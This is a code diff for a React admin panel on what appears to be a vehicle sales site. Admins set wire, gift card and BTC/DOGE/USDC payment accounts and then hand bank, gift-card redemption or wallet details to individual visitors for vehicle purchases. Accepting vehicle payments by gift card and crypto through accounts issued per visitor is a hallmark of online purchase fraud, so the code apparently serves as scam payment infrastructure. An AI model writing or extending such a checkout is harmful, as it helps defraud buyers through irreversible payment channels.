+                    className="w-full px-3 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-xl text-white font-mono placeholder:text-slate-500 focus:outline-none focus:border-blue-400"
+                  />
+                </div>
+
+                <div className="space-y-1.5">
+                  <label className="text-xs font-semibold text-blue-200 flex items-center gap-1.5">
+                    <Gift className="w-3.5 h-3.5 text-emerald-400" />
+                    <span>Gift Card Settlement Details</span>
+                  </label>
+                  <textarea
+                    rows={3}
+                    value={giftCardInstructionsInput}
+                    onChange={(e) => setGiftCardInstructionsInput(e.target.value)}
+                    placeholder="Enter accepted gift card brands, verification email/account, and instructions..."
+                    className="w-full px-3 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-xl text-white font-mono placeholder:text-slate-500 focus:outline-none focus:border-blue-400"
+                  />
+                </div>
+
+                <div className="space-y-1.5">
+                  <label className="text-xs font-semibold text-blue-200 flex items-center gap-1.5">
+                    <Wallet className="w-3.5 h-3.5 text-red-400" />
+                    <span>Bitcoin / Doge / USDC Wallet Address</span>
+                  </label>
+                  <textarea
+                    rows={3}
+                    value={cryptoAddressInput}
+                    onChange={(e) => setCryptoAddressInput(e.target.value)}
+                    placeholder="Enter BTC / DOGE / USDC wallet address and accepted network..."
+                    className="w-full px-3 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-xl text-white font-mono placeholder:text-slate-500 focus:outline-none focus:border-blue-400"
+                  />
+                </div>
+              </div>
+
+              <div className="flex flex-wrap items-center justify-end gap-2.5">
+                <button
+                  type="button"
+                  onClick={() => {
+                    setWireDetailsInput('');
+                    setGiftCardInstructionsInput('');
+                    setCryptoAddressInput('');
+                    onSaveAdminPaymentAccounts?.({
+                      wireDetails: '',
+                      giftCardInstructions: '',
+                      cryptoAddress: '',
+                      updatedAt: new Date().toISOString(),
+                    });
+                    setAccountsSavedBanner(true);
+                    setTimeout(() => setAccountsSavedBanner(false), 2500);
+                  }}
+                  className="px-3.5 py-2 rounded-lg bg-[#040a18] border border-blue-900/70 text-slate-300 hover:text-white text-xs font-semibold cursor-pointer"
+                >
+                  Clear Public Checkout Accounts
+                </button>
+                <button
+                  type="button"
+                  onClick={() => {
+                    onSaveAdminPaymentAccounts?.({
+                      wireDetails: wireDetailsInput.trim(),
+                      giftCardInstructions: giftCardInstructionsInput.trim(),
+                      cryptoAddress: cryptoAddressInput.trim(),
+                      updatedAt: new Date().toISOString(),
+                    });
+                    setAccountsSavedBanner(true);
+                    setTimeout(() => setAccountsSavedBanner(false), 2500);
+                  }}
+                  className="px-4 py-2 rounded-lg bg-gradient-to-r from-blue-600 to-red-600 hover:brightness-110 text-white text-xs font-bold cursor-pointer"
+                >
+                  Save Payment Accounts
+                </button>
+              </div>
+            </div>
+
+            <div className="space-y-3">
+              <div className="flex items-center justify-between pb-2 border-b border-blue-900/60">
+                <h4 className="font-bold text-sm text-white">
+                  Visitor Account Requests ({paymentAccountRequests.length})
+                </h4>
+                <span className="text-xs font-mono text-slate-400">
+                  {pendingAccountRequests.length} awaiting admin issuance
+                </span>
+              </div>
+
+              {paymentAccountRequests.length === 0 ? (
+                <div className="p-10 text-center rounded-2xl bg-[#08142b] border border-blue-900/60 text-slate-400 text-xs">
+                  No visitors have requested a Wire Transfer or Crypto payment account yet.
+                </div>
+              ) : (
+                <div className="space-y-3">
+                  {paymentAccountRequests.map((req) => {
+                    const isPending = req.status === 'pending_admin';
+                    const draft = accountDrafts[req.id] ?? '';
+                    return (
+                      <div
+                        key={req.id}
+                        className={`p-4 rounded-2xl border space-y-3 ${
+                          isPending
+                            ? 'bg-gradient-to-r from-red-950/25 via-blue-950/20 to-[#08142b] border-red-500/45'
+                            : 'bg-[#08142b] border-emerald-500/40'
+                        }`}
+                      >
+                        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
+                          <div className="space-y-0.5">
+                            <div className="flex flex-wrap items-center gap-2 text-[11px] font-mono">
+                              <span className="text-blue-300 font-bold">{req.id}</span>
+                              <span className="text-slate-500">·</span>
+                              <span className="text-red-300 font-bold uppercase">
+                                {req.paymentMethod === 'wire'
+                                  ? 'Wire Transfer / ACH'
+                                  : req.paymentMethod === 'gift_card'
+                                  ? 'Gift Card'
+                                  : 'Bitcoin / Doge / USDC'}
+                              </span>
+                              <span className="text-slate-500">·</span>
+                              <span className="text-slate-400">{req.timeStr}</span>
+                            </div>
+                            <div className="text-sm font-bold text-white">
+                              {req.vehicleName} — <span className="text-blue-300 font-mono tabular-nums">${req.amountDue.toLocaleString()}</span>
+                            </div>
+                            <div className="text-xs text-slate-300">
+                              Visitor: <strong className="text-white">{req.visitorName}</strong> ({req.visitorEmail})
+                            </div>
+                            {req.note && (
+                              <div className="text-[11px] text-slate-400 italic">
+                                Visitor note: &ldquo;{req.note}&rdquo;
+                              </div>
+                            )}
+                          </div>
+
+                          <span
+                            className={`text-[10px] font-mono font-bold px-2.5 py-1 rounded uppercase self-start ${
+                              isPending
+                                ? 'bg-red-950/70 text-red-200 border border-red-500/45'
+                                : 'bg-emerald-950/70 text-emerald-300 border border-emerald-500/45'
+                            }`}
+                          >
+                            {isPending ? 'Pending Admin Account' : 'Account Issued'}
+                          </span>
+                        </div>
+
+                        {isPending ? (
+                          <div className="flex flex-col sm:flex-row gap-2 pt-2 border-t border-blue-900/60">
+                            <input
+                              type="text"
+                              value={draft}
+                              onChange={(e) =>
+                                setAccountDrafts((prev) => ({ ...prev, [req.id]: e.target.value }))
+                              }
+                              placeholder={
+                                req.paymentMethod === 'wire'
+                                  ? 'Enter Wire/ACH Bank, Routing, Account Number & Beneficiary...'
+                                  : req.paymentMethod === 'gift_card'
+                                  ? 'Enter Accepted Gift Card Brand, Redemption Account & Instructions...'
+                                  : 'Enter BTC / DOGE / USDC Wallet Address & Network...'
+                              }
+                              className="flex-1 px-3 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-white font-mono placeholder:text-slate-500 focus:outline-none focus:border-blue-400"
+                            />
+                            <button
+                              type="button"
+                              disabled={!draft.trim()}
+                              onClick={() => {
+                                if (!draft.trim()) return;
+                                onIssuePaymentAccount?.(req.id, draft.trim());
+                                setAccountDrafts((prev) => ({ ...prev, [req.id]: '' }));
+                              }}
+                              className="px-4 py-2 rounded-lg bg-gradient-to-r from-blue-600 to-emerald-600 hover:brightness-110 disabled:opacity-40 text-white text-xs font-bold cursor-pointer whitespace-nowrap flex items-center justify-center gap-1.5"
+                            >
+                              <Send className="w-3.5 h-3.5" />
+                              <span>Provide Account to Visitor</span>
+                            </button>
+                          </div>
+                        ) : (
+                          <div className="p-3 rounded-xl bg-[#040a18] border border-emerald-500/35 text-xs font-mono text-emerald-200 break-all">
+                            Issued: {req.issuedAccountDetails}
+                          </div>
+                        )}
+                      </div>
+                    );
+                  })}
+                </div>
+              )}
             </div>
           </div>
         )}
